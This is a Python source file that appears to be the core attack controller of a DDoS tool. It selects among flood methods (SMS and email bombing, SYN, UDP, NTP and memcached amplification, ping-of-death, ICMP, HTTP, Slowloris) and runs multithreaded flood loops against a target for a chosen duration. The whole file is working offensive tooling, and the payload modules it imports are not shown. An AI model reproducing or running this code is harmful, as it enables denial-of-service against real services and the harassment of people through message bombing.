# Import modules
from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck

def GetMethodByName(method):
    methods = {
        "SMS": "tools.SMS.main",
        "EMAIL": "tools.EMAIL.main",
        "SYN": "tools.L4.syn",
        "UDP": "tools.L4.udp",
        "NTP": "tools.L4.ntp",
        "POD": "tools.L4.pod",
        "ICMP": "tools.L4.icmp",
        "MEMCACHED": "tools.L4.memcached",
        "HTTP": "tools.L7.http",
        "SLOWLORIS": "tools.L7.slowloris"
    }
    if method not in methods:
        raise SystemExit(f"{Fore.RED}[!] {Fore.MAGENTA}Unknown ddos method {repr(method)} selected..{Fore.RESET}")
    module = __import__(methods[method], fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(f"Method 'flood' not found in {repr(methods[method])}. Please use python 3.8", "-")

class AttackMethod:
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack completed!{Fore.RESET}")

    def __RunTimer(self):
        stop_time = time() + self.duration
        while time() < stop_time:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    def __RunThreads(self):
        thread = Thread(target=self.__RunTimer)
        thread.start()
        if self.name == "EMAIL":
            self.threads_count = 1
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        with Spinner(label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}", total=100) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        for index, thread in enumerate(self.threads):
            thread.join()
            print(f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}")

    def Start(self):
        if self.name == "EMAIL":
            target = self.target_name
        else:
            target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attack will be stopped after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
            )
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)
